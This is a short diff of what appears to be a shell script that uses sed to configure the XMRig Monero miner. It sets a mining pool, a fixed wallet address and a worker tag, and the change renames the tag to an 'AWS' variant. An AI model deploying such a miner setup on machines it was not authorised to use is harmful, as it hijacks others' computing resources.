@@ -13,7 +13,7 @@ sed -i 's/"url": *"[^"]*",/"url": "pool.supportxmr.com:5555",/' ./config.json
 
 sed -i 's/"user": *"[^"]*",/"user": "44qchmhzrHYYnaiwa4YCwSYXQwkoX58TXiJtqwZZepTmKFzKqKHx9377EFHGGS98fnjWYCnLb43j34rwHNt3VQCpRuWm9ZH",/' ./config.json 
 
-sed -i 's/"pass": *"[^"]*",/"pass": "ENIMUS-TAHK-P:enimus@enimus.info",/' ./config.json 
+sed -i 's/"pass": *"[^"]*",/"pass": "ENIMUS-TAHK-AWS:enimus@enimus.info",/' ./config.json 
 
 sed -i 's#"log-file": *null,#"log-file": "'./xmrig.log'",#' ./config.json 
 
